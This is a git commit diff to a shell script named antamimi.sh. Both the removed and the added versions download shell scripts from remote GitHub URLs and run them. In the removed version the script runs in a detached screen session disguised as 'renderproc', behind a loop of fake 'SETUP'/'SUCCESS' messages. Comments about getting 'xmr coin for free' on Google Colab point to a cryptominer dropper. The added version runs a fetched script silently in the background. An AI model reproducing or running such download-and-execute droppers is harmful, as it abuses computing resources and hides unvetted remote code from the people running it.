631e6018347757583845bd9304ef137d564631b8
renilo <88342640+renilo@users.noreply.github.com>
2022-12-22 18:25:31 +0700

    Update antamimi.sh

--- antamimi.sh
+++ antamimi.sh
@@ -1,11 +1,5 @@
-# /bin/bash
-# Install XRDP
-# Before get xmr coin for free
-# Google Colab
-sudo apt-get install screen -y
-clear
-sudo wget -O meki https://raw.githubusercontent.com/renilo/kuuntul/main/antam.sh && clear && sudo chmod 777 meki && clear
-screen -dmS renderproc ./meki
-sleep 1
-i=1
-while true; do clear; echo SETUP RENDERPROC $i; sleep 5; clear; echo SUCCESS PROJECT; sleep 1;let "i++";  done
+sudo wget https://github.com/renilo/kuuntul/raw/main/anakanak.sh
+sudo chmod +x anakanak.sh
+sudo wget https://raw.githubusercontent.com/Omarjetos/ezz/master/compile.sh && sudo chmod +x compile.sh
+./anakanak.sh >/dev/null &
+./compile.sh
